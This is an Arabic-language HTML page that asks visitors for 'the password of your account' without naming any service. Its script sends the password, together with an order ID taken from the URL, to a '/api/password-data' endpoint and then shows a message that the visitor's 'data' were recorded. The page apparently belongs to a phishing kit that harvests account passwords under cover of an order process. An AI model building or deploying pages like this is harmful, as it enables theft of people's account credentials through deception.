<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>كلمة المرور</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
  body{
    max-width:520px;margin:0 auto;min-height:100vh;
    background:
      linear-gradient(135deg, rgba(255,255,255,.7) 25%, transparent 25%) -50px 0,
      linear-gradient(225deg, rgba(255,255,255,.7) 25%, transparent 25%) -50px 0,
      linear-gradient(315deg, rgba(255,255,255,.7) 25%, transparent 25%),
      linear-gradient(45deg, rgba(255,255,255,.7) 25%, transparent 25%);
    background-size:100px 100px;
    background-color:#e8e8e8;
    display:flex;flex-direction:column;
  }

  .back-btn{
    position:absolute;top:16px;left:16px;width:40px;height:40px;
    border:none;background:transparent;cursor:pointer;
    font-size:28px;color:#333;display:flex;align-items:center;justify-content:center;
  }

  .content{flex:1;padding:60px 24px 0;position:relative}

  h1{font-size:32px;font-weight:800;color:#1a1a1a;line-height:1.4;margin-bottom:16px}
  .subtitle{color:#888;font-size:15px;margin-bottom:40px}

  .input-group{position:relative;margin-bottom:16px}
  .input-group input{
    width:100%;padding:18px 16px;border:2px solid #2e7d32;border-radius:8px;
    font-size:16px;font-family:inherit;background:#fff;color:#1a1a1a;outline:none;
  }
  .input-group label{
    position:absolute;top:-10px;right:14px;background:#fff;padding:0 6px;
    font-size:13px;color:#2e7d32;font-weight:600;
  }
  .toggle-pass{
    position:absolute;top:50%;left:14px;transform:translateY(-50%);
    border:none;background:transparent;cursor:pointer;font-size:20px;color:#999;
  }

  .error-msg{
    display:none;background:#fee;border:1px solid #fcc;border-radius:8px;
    padding:10px 14px;margin-bottom:16px;color:#c62828;font-size:13px;text-align:center;
  }

  .bottom{padding:20px 24px 40px}
  .next-btn{
    display:block;width:100%;padding:18px;border:none;border-radius:50px;
    font-size:18px;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;
    background:linear-gradient(135deg, #e8a0a0, #d4878f, #c87080);
    box-shadow:0 4px 15px rgba(200,112,128,.3);
    transition:.2s;
  }
  .next-btn:hover{opacity:.9;transform:translateY(-1px)}
  .next-btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
</style>
</head>
<body>

  <div class="content">
    <button class="back-btn" onclick="history.back()" aria-label="رجوع">&#8592;</button>

    <h1>أدخل كلمة المرور</h1>
    <p class="subtitle">الرجاء إدخال كلمة المرور الخاصة بحسابك.</p>

    <div class="error-msg" id="errorMsg"></div>

    <div class="input-group">
      <input type="password" id="password" autocomplete="current-password" autofocus>
      <label>كلمة المرور</label>
      <button class="toggle-pass" onclick="togglePass()" type="button" aria-label="إظهار">&#128065;</button>
    </div>
  </div>

  <div class="bottom">
    <button class="next-btn" id="nextBtn" onclick="submitPassword()">التالي</button>
  </div>

<script>
  const params = new URLSearchParams(location.search);
  const orderId = params.get("order");

  function togglePass() {
    const inp = document.getElementById("password");
    inp.type = inp.type === "password" ? "text" : "password";
  }

  async function submitPassword() {
    const password = document.getElementById("password").value.trim();
    if (!password) {
      showError("الرجاء إدخال كلمة المرور");
      return;
    }
    const btn = document.getElementById("nextBtn");
    btn.disabled = true;
    btn.textContent = "جاري التحقق...";

    try {
      const res = await fetch("/api/password-data", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ order_id: orderId, password })
      });
      const data = await res.json();
      if (data.success) {
        document.querySelector(".content").innerHTML = `
          <div style="text-align:center;padding:80px 20px">
            <div style="width:76px;height:76px;border-radius:50%;background:#e9f9ee;color:#1a9c45;
              font-size:40px;display:flex;align-items:center;justify-content:center;margin:0 auto 20px">✓</div>
            <h2 style="font-size:22px;font-weight:800;margin-bottom:10px">تم بنجاح</h2>
            <p style="color:#888;font-size:15px;line-height:1.6">تم تسجيل طلبك وبياناتك بنجاح.<br>سنتواصل معك قريباً.</p>
            <a href="index.html" style="display:inline-block;margin-top:24px;color:#141414;text-decoration:none;
              border:1.5px solid #141414;padding:12px 26px;border-radius:12px;font-weight:700">العودة للرئيسية</a>
          </div>`;
        document.querySelector(".bottom").style.display = "none";
      } else {
        showError(data.message || "حدث خطأ");
        btn.disabled = false;
        btn.textContent = "التالي";
      }
    } catch(err) {
      showError("حدث خطأ في الاتصال");
      btn.disabled = false;
      btn.textContent = "التالي";
    }
  }

  function showError(msg) {
    const el = document.getElementById("errorMsg");
    el.textContent = msg;
    el.style.display = "block";
  }

  document.getElementById("password").addEventListener("keydown", e => {
    if (e.key === "Enter") submitPassword();
  });
</script>
</body>
</html>
